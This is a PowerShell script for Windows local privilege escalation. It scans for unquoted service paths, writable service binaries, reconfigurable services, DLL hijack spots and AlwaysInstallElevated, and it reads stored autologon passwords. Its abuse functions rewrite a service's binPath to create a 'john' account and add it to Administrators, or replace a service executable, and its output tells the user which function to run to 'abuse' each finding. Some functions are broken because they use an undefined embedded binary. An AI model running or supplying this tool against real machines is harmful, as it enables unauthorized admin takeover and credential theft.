function Get-ServiceUnquoted {
    <#
    .SYNOPSIS
        Finds services with unquoted executable paths that contain spaces.
    #>
    $VulnServices = Get-WmiObject Win32_Service |
        Where-Object { $_.PathName -and $_.PathName.Trim() -ne "" } |
        Where-Object { -not $_.PathName.StartsWith('"') } |
        Where-Object { ($_.PathName.Substring(0, $_.PathName.IndexOf(".exe") + 4)) -match ".* .*" }

    foreach ($service in $VulnServices) {
        $out = New-Object System.Collections.Specialized.OrderedDictionary
        $out.Add('ServiceName', $service.Name)
        $out.Add('Path', $service.PathName)
        $out
    }
}

function Get-ServiceEXEPerms {
    <#
    .SYNOPSIS
        Finds service executables outside System32 that are writable.
    #>
    $services = Get-WmiObject Win32_Service |
        Where-Object { $_.PathName -and $_.PathName -notmatch ".*system32.*" }

    foreach ($service in $services) {
        try {
            $path = ($service.PathName.Substring(0, $service.PathName.IndexOf(".exe") + 4)).Replace('"', "")
            if ((Test-Path $path) -and -not $path.Contains("NisSrv.exe") -and -not $path.Contains("MsMpEng.exe")) {
                $file = Get-Item $path -Force
                $stream = $file.OpenWrite()
                $stream.Close() | Out-Null

                $out = New-Object System.Collections.Specialized.OrderedDictionary
                $out.Add('ServiceName', $service.Name)
                $out.Add('Path', $service.PathName)
                $out
            }
        }
        catch {
            if ($_.Exception.Message -match "by another process") {
                $out = New-Object System.Collections.Specialized.OrderedDictionary
                $out.Add('ServiceName', $service.Name)
                $out.Add('Path', $service.PathName)
                $out
            }
        }
    }
}

function Get-ServicePerms {
    <#
    .SYNOPSIS
        Tests whether services can be reconfigured.
    #>
    $services = Get-WmiObject Win32_Service
    foreach ($service in $services) {
        $result = sc.exe config $($service.Name) error= $($service.ErrorControl)
        if ($result -contains "[SC] ChangeServiceConfig SUCCESS") {
            $out = New-Object System.Collections.Specialized.OrderedDictionary
            $out.Add('ServiceName', $service.Name)
            $out.Add('Path', $service.PathName)
            $out
        }
    }
}

function Invoke-ServiceUserAdd {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)] [string]$ServiceName,
        [string]$UserName = "john",
        [string]$Password = "Password123!",
        [string]$GroupName = "Administrators"
    )

    $TargetService = Get-WmiObject Win32_Service -Filter "Name='$ServiceName'"
    if ($TargetService) {
        try {
            $RestoreDisabled = $false
            if ($TargetService.StartMode -eq "Disabled") {
                Write-Verbose "Service '$ServiceName' disabled, enabling..."
                $result = sc.exe config $($TargetService.Name) start= demand
                if ($result -contains "Access is denied.") {
                    Write-Warning "[!] Access to service $($TargetService.Name) denied"
                    return $false
                }
                $RestoreDisabled = $true
            }

            $OriginalPath  = $TargetService.PathName
            $OriginalState = $TargetService.State
            Write-Verbose "Service '$ServiceName' original path: '$OriginalPath'"
            Write-Verbose "Service '$ServiceName' original state: '$OriginalState'"

            Write-Verbose "Adding user '$UserName'"
            $result = sc.exe stop $($TargetService.Name)
            if ($result -contains "Access is denied.") {
                Write-Warning "[!] Access to service $($TargetService.Name) denied"
                return $false
            }

            $UserAddCommand = "net user $UserName $Password /add"
            $result = sc.exe config $($TargetService.Name) binPath= $UserAddCommand
            if ($result -contains "Access is denied.") {
                Write-Warning "[!] Access to service $($TargetService.Name) denied"
                return $false
            }

            $result = sc.exe start $($TargetService.Name)
            Start-Sleep -Seconds 1

            Write-Verbose "Adding user '$UserName' to group '$GroupName'"
            sc.exe stop $($TargetService.Name) | Out-Null
            Start-Sleep -Seconds 1

            $GroupAddCommand = "net localgroup $GroupName $UserName /add"
            sc.exe config $($TargetService.Name) binPath= $GroupAddCommand | Out-Null
            sc.exe start $($TargetService.Name) | Out-Null
            Start-Sleep -Seconds 1

            Write-Verbose "Restoring original path to service '$ServiceName'"
            sc.exe stop $($TargetService.Name) | Out-Null
            Start-Sleep -Seconds 1
            sc.exe config $($TargetService.Name) binPath= $OriginalPath | Out-Null

            if ($RestoreDisabled) {
                Write-Verbose "Re-disabling service '$ServiceName'"
                sc.exe config $($TargetService.Name) start= disabled | Out-Null
            }
            elseif ($OriginalState -eq "Paused") {
                Write-Verbose "Starting and then pausing service '$ServiceName'"
                sc.exe start $($TargetService.Name) | Out-Null
                Start-Sleep -Milliseconds 500
                sc.exe pause $($TargetService.Name) | Out-Null
            }
            elseif ($OriginalState -eq "Stopped") {
                Write-Verbose "Leaving service '$ServiceName' in stopped state"
            }
            else {
                Write-Verbose "Starting service '$ServiceName'"
                sc.exe start $($TargetService.Name) | Out-Null
            }

            "[+] User '$UserName' created with password '$Password' and added to localgroup '$GroupName'"
        }
        catch {
            Write-Warning "Error while modifying service '$ServiceName': $_"
            $false
        }
    }
    else {
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $false
    }
}

function Write-UserAddServiceBinary {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)] [string]$ServiceName,
        [string]$Path = "service.exe",
        [string]$UserName = "john",
        [string]$Password = "Password123!",
        [string]$GroupName = "Administrators"
    )

    $enc = [System.Text.Encoding]::Unicode
    $ServiceNameBytes = $enc.GetBytes($ServiceName)
    $UserNameBytes    = $enc.GetBytes($UserName)
    $PasswordBytes    = $enc.GetBytes($Password)
    $GroupNameBytes   = $enc.GetBytes($GroupName)

    for ($i=0; $i -lt $ServiceNameBytes.Length; $i++) { $Binary[$i+2870] = $ServiceNameBytes[$i] }
    for ($i=0; $i -lt $UserNameBytes.Length;    $i++) { $Binary[$i+2932] = $UserNameBytes[$i] }
    for ($i=0; $i -lt $PasswordBytes.Length;    $i++) { $Binary[$i+2994] = $PasswordBytes[$i] }
    for ($i=0; $i -lt $GroupNameBytes.Length;   $i++) { $Binary[$i+3056] = $GroupNameBytes[$i] }

    try {
        Set-Content -Value $Binary -Encoding Byte -Path $Path
        "[*] Binary for service '$ServiceName' to create user '$UserName : $Password' written to '$Path'"
    }
    catch {
        Write-Warning "Error while writing to location '$Path': $_"
        $false
    }
}

function Write-UserAddMSI {
    try {
        [System.Convert]::FromBase64String($Binary) | Set-Content -Path $Path -Encoding Byte
        "[*] User add .MSI written to '$Path'"
    }
    catch {
        Write-Warning "Error while writing to location '$Path': $_"
        $false
    }
}

function Write-ServiceEXE {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)] [string]$ServiceName,
        [string]$UserName = "john",
        [string]$Password = "Password123!",
        [string]$GroupName = "Administrators"
    )

    $TargetService = Get-WmiObject Win32_Service -Filter "Name='$ServiceName'"
    if ($TargetService) {
        try {
            $ServicePath = $TargetService.PathName.Trim('"')
            $BackupPath  = $ServicePath + ".bak"

            Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"
            Move-Item $ServicePath $BackupPath

            Write-UserAddServiceBinary -ServiceName $ServiceName -UserName $UserName -Password $Password -GroupName $GroupName -Path $ServicePath
        }
        catch {
            Write-Warning "Error: $_"
            $false
        }
    }
    else {
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $false
    }
}

function Restore-ServiceEXE {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)] [string]$ServiceName,
        [string]$BackupPath
    )

    $TargetService = Get-WmiObject Win32_Service -Filter "Name='$ServiceName'"
    if ($TargetService) {
        try {
            $ServicePath = $TargetService.PathName.Trim('"')
            if (-not $BackupPath) { $BackupPath = $ServicePath + ".bak" }

            "Restoring '$BackupPath' to '$ServicePath'"
            Copy-Item $BackupPath $ServicePath
            "Removing backup binary '$BackupPath'"
            Remove-Item $BackupPath
        }
        catch {
            Write-Warning "Error: $_"
            $false
        }
    }
    else {
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $false
    }
}

function Invoke-ServiceStart {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)] [string]$ServiceName
    )

    $TargetService = Get-WmiObject Win32_Service -Filter "Name='$ServiceName'"
    if ($TargetService) {
        try {
            if ($TargetService.StartMode -eq "Disabled") {
                $r = Invoke-ServiceEnable -ServiceName $ServiceName
                if (-not $r) { return $false }
            }
            Write-Verbose "Starting service '$ServiceName'"
            $result = sc.exe start $($TargetService.Name)
            if ($result -contains "Access is denied.") {
                Write-Warning "[!] Access to service $($TargetService.Name) denied"
                $false
            } else { $true }
        }
        catch {
            Write-Warning "Error: $_"
            $false
        }
    }
    else {
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $false
    }
}

function Invoke-ServiceStop {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)] [string]$ServiceName
    )

    $TargetService = Get-WmiObject Win32_Service -Filter "Name='$ServiceName'"
    if ($TargetService) {
        try {
            Write-Verbose "Stopping service '$ServiceName'"
            $result = sc.exe stop $($TargetService.Name)
            if ($result -contains "Access is denied.") {
                Write-Warning "[!] Access to service $($TargetService.Name) denied"
                $false
            } else { $true }
        }
        catch {
            Write-Warning "Error: $_"
            $false
        }
    }
    else {
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $false
    }
}

function Invoke-ServiceEnable {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)] [string]$ServiceName
    )

    $TargetService = Get-WmiObject Win32_Service -Filter "Name='$ServiceName'" | Where-Object {$_}

    if ($TargetService){
        try {
            Write-Verbose "Enabling service '$ServiceName'"
            $result = sc.exe config $($TargetService.Name) start= demand
            if ($result -contains "Access is denied."){
                Write-Warning "[!] Access to service $($TargetService.Name) denied"
                $false
            }
            else { $true }
        }
        catch {
            Write-Warning "Error: $_"
            $false
        }
    }
    else {
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $false
    }
}

function Invoke-ServiceDisable {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)] [string]$ServiceName
    )

    $TargetService = Get-WmiObject Win32_Service -Filter "Name='$ServiceName'" | Where-Object {$_}

    if ($TargetService){
        try {
            Write-Verbose "Disabling service '$ServiceName'"
            $result = sc.exe config $($TargetService.Name) start= disabled
            if ($result -contains "Access is denied."){
                Write-Warning "[!] Access to service $($TargetService.Name) denied"
                $false
            }
            else { $true }
        }
        catch {
            Write-Warning "Error: $_"
            $false
        }
    }
    else {
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $false
    }
}

function Get-ServiceDetails {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)] [string]$ServiceName
    )

    $TargetService = Get-WmiObject Win32_Service -Filter "Name='$ServiceName'" | Where-Object {$_}

    if ($TargetService){
        try { $TargetService | Format-List * }
        catch {
            Write-Warning "Error: $_"
            $null
        }
    }
    else {
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $null
    }
}

function Invoke-FindDLLHijack {
    [CmdletBinding()]
    param(
        [Parameter()] [Switch] $ExcludeWindows,
        [Parameter()] [Switch] $ExcludeProgramFiles,
        [Parameter()] [Switch] $ExcludeOwned
    )

    $keys = Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs"
    $KnownDLLs = foreach ($name in $keys.GetValueNames()) { $keys.GetValue($name) } | Where-Object { $_.EndsWith(".dll") }

    $processes = Get-Process
    $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

    $owners = @{}
    Get-WmiObject Win32_Process | Where-Object {$_} | ForEach-Object { $owners[$_.Handle] = $_.GetOwner().User }

    foreach ($process in Get-Process | Where-Object {$_.Path}) {
        $BasePath = Split-Path $process.Path -Parent
        $LoadedModules = $process.Modules
        $ProcessOwner = $owners[$process.Id.ToString()]

        foreach ($module in $LoadedModules){
            $ModulePath = "$BasePath\$($module.ModuleName)"

            if ((-not $ModulePath.Contains("C:\Windows\System32")) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -notcontains $module.ModuleName)) {
                $Exclude = $false
                if ($ExcludeWindows -and $ModulePath.Contains("C:\Windows")) { $Exclude = $true }
                if ($ExcludeProgramFiles -and $ModulePath.Contains("C:\Program Files")) { $Exclude = $true }
                if ($ExcludeOwned -and $CurrentUser.Contains($ProcessOwner)) { $Exclude = $true }

                if (-not $Exclude){
                    $out = New-Object System.Collections.Specialized.OrderedDictionary
                    $out.add('ProcessPath', $Process.Path)
                    $out.add('Owner', $ProcessOwner)
                    $out.add('HijackablePath', $ModulePath)
                    $out
                }
            }
        }
    }
}

function Invoke-FindPathDLLHijack {
    [CmdletBinding()] param()

    $Paths = (Get-Item Env:Path).Value.Split(';') | Where-Object {$_ -ne ""}
    $WriteablePaths = @()

    foreach ($Path in $Paths){
        $testPath = Join-Path $Path ([IO.Path]::GetRandomFileName())
        try { [IO.File]::Create($testPath, 1, 'DeleteOnClose') > $null; $WriteablePaths += $Path }
        catch {}
        finally { Remove-Item $testPath -ErrorAction SilentlyContinue }
    }

    Write-Verbose "Writable folder locations from %PATH%: $WriteablePaths"

    if ($WriteablePaths -and ($WriteablePaths.Length -ne 0)){
        foreach ($Path in $WriteablePaths){
            $OS = Get-WmiObject Win32_OperatingSystem -Computer "localhost" | Select-Object -ExpandProperty BuildNumber

            if ($OS -match '7601') {
                Write-Verbose "Windows 7 detected"
                $service = Get-WmiObject Win32_Service -Filter "Name='IKEEXT'" | Where-Object {$_}
                if ($service -and ($service.StartMode -eq "Auto")){
                    $out = New-Object System.Collections.Specialized.OrderedDictionary
                    $out.add('Service', 'IKEEXT')
                    $out.add('HijackablePath' , (Join-Path $Path "wlbsctrl.dll"))
                    $out
                }
            }
            elseif ($OS -match '2600') {
                Write-Verbose "Windows XP detected"
                foreach ($svc in 'wuauserv','RDSessMgr','RasMan','winmgmt'){
                    $dll = switch ($svc) {
                        'wuauserv' {'ifsproxy.dll'}
                        'RDSessMgr' {'SalemHook.dll'}
                        'RasMan' {'ipbootp.dll'}
                        'winmgmt' {'wbemcore.dll'}
                    }
                    $service = Get-WmiObject Win32_Service -Filter "Name='$svc'" | Where-Object {$_}
                    if ($service -and ($service.StartMode -eq "Auto")){
                        $out = New-Object System.Collections.Specialized.OrderedDictionary
                        $out.add('Service',$svc)
                        $out.add('HijackablePath',(Join-Path $Path $dll))
                        $out
                    }
                }
            }
            else {
                Write-Warning "This version of Windows not supported by Invoke-FindPathDLLHijack"
            }
        }
    }
}

function Get-RegAlwaysInstallElevated {
    [CmdletBinding()] param()

    if (Test-Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer") {
        $HKLMval = Get-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){
            $HKCUval = Get-ItemProperty -Path "HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){ $true } else { $false }
        } else { $false }
    } else { $false }
}

function Get-RegAutoLogon {
    [CmdletBinding()] param()

    $AutoAdminLogon = Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue
    if ($AutoAdminLogon.AutoAdminLogon -ne 0){
        $DefaultDomainName = (Get-ItemProperty "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $DefaultUserName = (Get-ItemProperty "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $DefaultPassword = (Get-ItemProperty "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword

        if ($DefaultUserName) {
            $out = New-Object System.Collections.Specialized.OrderedDictionary
            $out.add('DefaultDomainName',$DefaultDomainName)
            $out.add('DefaultUserName',$DefaultUserName)
            $out.add('DefaultPassword',$DefaultPassword)
            $out
        }

        $AltDefaultDomainName = (Get-ItemProperty "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $AltDefaultUserName = (Get-ItemProperty "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $AltDefaultPassword = (Get-ItemProperty "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

        if ($AltDefaultUserName) {
            $out = New-Object System.Collections.Specialized.OrderedDictionary
            $out.add('AltDefaultDomainName',$AltDefaultDomainName)
            $out.add('AltDefaultUserName',$AltDefaultUserName)
            $out.add('AltDefaultPassword',$AltDefaultPassword)
            $out
        }
    }
}

function Get-UnattendedInstallFiles {
    $SearchLocations = @("C:\sysprep\sysprep.xml",
                        "C:\sysprep.inf",
                        (Join-Path $env:windir "\Panther\Unattended.xml"),
                        (Join-Path $env:windir "\Panther\Unattend\Unattended.xml"))
    $SearchLocations | Where-Object { Test-Path $_ }
}

function Invoke-AllChecks {
    $StatusOutput = @()
    $StatusOutput += "`n[*] Running Invoke-AllChecks"

    $StatusOutput += "`n`n[*] Checking for unquoted service paths..."
    $UnquotedServices = Get-ServiceUnquoted
    if ($UnquotedServices){
        $StatusOutput += "[*] Use 'Write-UserAddServiceBinary' to abuse`n"
        foreach ($Service in $UnquotedServices){
            $StatusOutput += "[+] Unquoted service path: $($Service.ServiceName) - $($Service.Path)"
        }
    }

    $StatusOutput += "`n`n[*] Checking service executable permissions..."
    $ServiceEXEs = Get-ServiceEXEPerms
    if ($ServiceEXEs){
        $StatusOutput += "[*] Use 'Write-ServiceEXE -ServiceName SVC' to abuse`n"
        foreach ($ServiceEXE in $ServiceEXEs){
            $StatusOutput += "[+] Vulnerable service executable: $($ServiceEXE.ServiceName) - $($ServiceEXE.Path)"
        }
    }

    $StatusOutput += "`n`n[*] Checking service permissions..."
    $VulnServices = Get-ServicePerms
    if ($VulnServices){
        $StatusOutput += "[*] Use 'Invoke-ServiceUserAdd' to abuse`n"
        foreach ($Service in $VulnServices){
            $StatusOutput += "[+] Vulnerable service: $($Service.ServiceName) - $($Service.Path)"
        }
    }

    $StatusOutput += "`n`n[*] Checking for unattended install files..."
    $InstallFiles = Get-UnattendedInstallFiles
    if ($InstallFiles){
        $StatusOutput += "[*] Examine install files for possible passwords`n"
        foreach ($File in $InstallFiles){ $StatusOutput += "[+] Unattended install file: $File" }
    }

    $StatusOutput += "`n`n[*] Checking %PATH% for potentially hijackable service .dll locations..."
    $HijackablePaths = Invoke-FindPathDLLHijack
    if ($HijackablePaths){
        foreach ($Path in $HijackablePaths){
            $StatusOutput += "[+] Hijackable service .dll: $($Path.Service) - $($Path.HijackablePath)"
        }
    }

    $StatusOutput += "`n`n[*] Checking for AlwaysInstallElevated registry key..."
    if (Get-RegAlwaysInstallElevated){
        $StatusOutput += "[*] Use 'Write-UserAddMSI' to abuse`n"
        $StatusOutput += "[+] AlwaysInstallElevated is enabled for this machine!"
    }

    $StatusOutput += "`n`n[*] Checking for Autologon credentials in registry...`n"
    $AutologonCreds = Get-RegAutoLogon
    if ($AutologonCreds){
        try {
            if ($AutologonCreds.DefaultUserName -and -not ($AutologonCreds.DefaultUserName -eq '')) {
                $StatusOutput += "[+] Autologon default credentials: $($AutologonCreds.DefaultDomainName), $($AutologonCreds.DefaultUserName), $($AutologonCreds.DefaultPassword)"
            }
        } catch {}
        try {
            if ($AutologonCreds.AltDefaultUserName -and -not ($AutologonCreds.AltDefaultUserName -eq '')) {
                $StatusOutput += "[+] Autologon alt credentials: $($AutologonCreds.AltDefaultDomainName), $($AutologonCreds.AltDefaultUserName), $($AutologonCreds.AltDefaultPassword)"
            }
        } catch {}
    }

    $StatusOutput
}

# PowerShell version check
if ((Get-Host).Version.Major -lt 5) {
    Write-Warning "[!] This script requires at least PowerShell version 5.0"
}

Invoke-AllChecks